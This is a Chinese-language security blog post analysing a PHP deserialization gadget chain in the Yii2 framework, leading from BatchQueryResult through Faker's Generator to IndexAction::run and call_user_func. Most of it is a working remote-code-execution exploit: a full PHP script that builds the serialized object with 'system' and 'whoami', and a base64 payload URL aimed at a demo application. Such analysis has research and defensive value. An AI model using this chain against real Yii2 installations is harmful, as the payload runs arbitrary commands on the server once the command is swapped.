---
title: "PHP 反序列化——Yii2 反序列化链分析"
description: "Yii2 反序列化链分析。"
publishDate: "2025-09-22T00:00:00+08:00"
ogImage: "https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/0df31c475c0bdfdc371dbfa6f0fbe139.jpeg"
categories: ["PHP Security"]
tags: ["php", "反序列化", "yii2"]
---
### 链路分析

```
vendor/yiisoft/yii2/db/BatchQueryResult.php
    | _destruct()::$this->reset()
    | $this->_dataReader->close();
    vendor/fzaninotto/faker/src/Faker/Generator.php::_call()
        | $this->format($method, $attributes)        
        | call_user_func_array($this->getFormatter($formatter), $arguments)
        vendor/yiisoft/yii2/rest/IndexAction.php::call_user_func
        | public function run()::call_user_func($this->checkAccess, $this->id)
```

跟到这一步 call_user_func_array($this->getFormatter($formatter), $arguments)可以通过下面的语法寻找 rce 点

```
call_user_func\(\$this->([a-zA-Z0-9]+), \$this->([a-zA-Z0-9]+)\)
```

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/ae18adbda639510ca51357ea0533b2d6.png)

## Payload

```
<?php


namespace yii\rest {
    class IndexAction
    {
        public $checkAccess;
        public $id;

        public function __construct()
        {
            $this->checkAccess = "system";
            $this->id = "whoami";

        }
    }
}

namespace Faker {

    use yii\rest\IndexAction;

    class Generator
    {
        protected $formatters;

        public function __construct()
        {
            $this->formatters['close'] = [new IndexAction(), 'run'];;//IndexAction::run()
        }
    }
}

namespace yii\db {

    use Faker\Generator;

    class BatchQueryResult
    {
        private $_dataReader;

        public function __construct()
        {
            $this->_dataReader = new Generator();
        }
    }

//    echo base64_encode(new BatchQueryResult());
}
namespace {
    use yii\db\BatchQueryResult;
    echo base64_encode(serialize(new BatchQueryResult()));
}
```

```
http://yii.demo/web/index.php/?r=demo/demo&input=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6Njoid2hvYW1pIjt9aToxO3M6MzoicnVuIjt9fX19
```

---

